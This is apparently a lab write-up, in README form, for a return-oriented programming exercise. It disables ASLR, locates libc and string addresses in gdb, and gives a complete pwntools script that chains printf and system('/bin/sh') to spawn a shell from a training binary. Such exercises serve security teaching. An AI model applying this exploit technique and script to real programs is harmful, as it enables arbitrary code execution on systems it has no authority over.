# Lab9-Rop-Way
Only the Rop way pop a shell &amp; print "I did it!" in one line


#### Check binary protections

![image](https://github.com/user-attachments/assets/78975428-d41a-4e06-bbfd-2bfae4c1cb86)

no protections at all , which means addresses are not randomized

ok so our goal is to pop a shell & print "I did it!" reading the characters from the memory

so first we need the libc base address , we will use gdb to get it but first we have to
#### Turn off ASLR
```bash
➜  ~ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
➜  ~ 
```

![image](https://github.com/user-attachments/assets/03dd8251-9bc3-4cbd-b9bf-411ec99d7879)


then spawn the binary into gdb by
```
gdb -q ./lab9
b unsafe
r
info proc mappings
```

<img width="1539" alt="image" src="https://github.com/user-attachments/assets/393b0ed0-1434-4ef0-b4a8-fff884bbd6de">

so in our case our libc_base addr is = `0xf7d84000`

now we have to find the characters to be printed

"I did it!"
okay so first we will find "I "

![image](https://github.com/user-attachments/assets/48c1e251-f069-449e-ac48-a52ede81ad08)

I = 0xf7f40c88

now we will find the keyword "did"

![image](https://github.com/user-attachments/assets/fa2f5343-2a4e-4915-94fa-cdd62d7815d8)

"did" = 0xf7d99b73

now we need a space after did , so we will find space " "

<img width="349" alt="image" src="https://github.com/user-attachments/assets/4f5f1fcf-f03f-4e62-9c86-31bdd90b21e7">

"space" = 0xf7d842d0

now lets find "it" keyword

<img width="385" alt="image" src="https://github.com/user-attachments/assets/9a9e62ef-6557-45fc-879c-fb3cc98ed8b3">

so "it" = 0xf7d9759c

now we need the last char "!"

<img width="343" alt="image" src="https://github.com/user-attachments/assets/892c1129-f2c8-4be3-8a86-c9349ea98cb6">

so "!" = 0xf7d845af

so we have all the addresses of our keywords

```
I = 0xf7f40c88
did = 0xf7d99b73
space = 0xf7d842d0
it = 0xf7d9759c
! = 0xf7d845af
```
thats total 5 chars to be printed in one line , for each char we need one %s , so we have to find 5 %s like "%s%s%s%s%s" with a slash n to be printed in one line
meaning we have to search for "%s%s%s%s%s\n" , lets do it , that would be our format string

<img width="1032" alt="image" src="https://github.com/user-attachments/assets/16575d6b-3b27-4231-8a28-6d1a78b01644">

"%s%s%s%s%s\n" = 0xf7f50d21

now lets write the exploit

`solve.py`

```py
import sys
from pwn import *

context(log_level='CRITICAL', arch='i386')

binary = ELF("lab9")
libc = ELF("/usr/lib32/libc.so.6")

libc_base = 0xf7d84000

I = 0xf7f40c88
did = 0xf7d99b73
it = 0xf7d9759c
ex = 0xf7d845af
space = 0xf7d842d0
fmt = 0xf7f50d21

rop = ROP(binary)

rop.call("printf", [fmt,I,did,space,it,ex])
rop.call(libc_base + libc.symbols['system'], [libc_base + next(libc.search(b'/bin/sh'))])

padding = b"a" * 22
exploit = rop.chain()
payload = padding + exploit
sys.stdout.buffer.write(payload)
```

![image](https://github.com/user-attachments/assets/24c9fe5b-1cfb-4201-b82d-82b0da0aae4b)

lets run it against the binary by

```bash
./lab9 $(python3 solve.py)
```


![image](https://github.com/user-attachments/assets/61b967b0-0de9-4d38-ba9b-b5453d05caa5)
